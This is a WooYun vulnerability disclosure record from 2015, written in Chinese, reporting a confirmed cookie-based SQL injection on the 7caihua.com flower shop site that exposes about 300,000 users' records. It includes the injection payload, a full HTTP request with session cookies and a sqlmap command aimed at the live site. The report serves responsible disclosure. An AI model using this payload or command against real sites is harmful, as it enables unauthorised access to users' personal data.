{"id": 70815, "wybug_id": "wooyun-2015-0133969", "wybug_title": "鲜花网sql注入可导致用户信息遍历", "wybug_corp": "七彩", "wybug_author": "路人甲", "wybug_date": "2015-08-14 15:07", "wybug_open_date": "2015-09-30 10:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向公众公开  简要描述： 鲜花网用户信息遍历 详细说明：  七彩鲜花网的COOKIE存在注入，可以遍历 30W(全部) 用户信息：首先我们注册一个账号：http://www.7caihua.com/\n\n之后登陆，修改COOKIE：\n\n然后访问http://www.7caihua.com/Userreg/userfriend得到部分用户信息\n\n通过修改COOKIE，为：1' or `HuserID`>'123456就可以得到HuserID>123456的用户10个，然后就可以继续遍历了，每次+10即可\n\n\n\n   漏洞证明：  当然，这是一个注入点~~我们也可以这么玩：\nGET /Userreg/userfriend HTTP/1.1Host: www.7caihua.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=jtt5ns0hh8n3e4uk76ar2vcrb3; Hm_lvt_decf2485e787ca5c8dc582772a6e3e66=1439465262,1439468619,1439469130; Hm_lvt_0a294f505236608e6cddc7b1b4bd24d9=1439465262,1439468619,1439469130; SERVERID=33a4db0819deceeb52aba7328d57d7f3|1439469138|1439469122; Hm_lpvt_decf2485e787ca5c8dc582772a6e3e66=1439469140; Hm_lpvt_0a294f505236608e6cddc7b1b4bd24d9=1439469140; hyhm=wooyun%40wooyun.org; HuserID=333930; istc=1Connection: keep-alive\nsqlmap.py -r c:/4.txt --dbms=mysql --bat -p HuserID\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-16 10:36 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}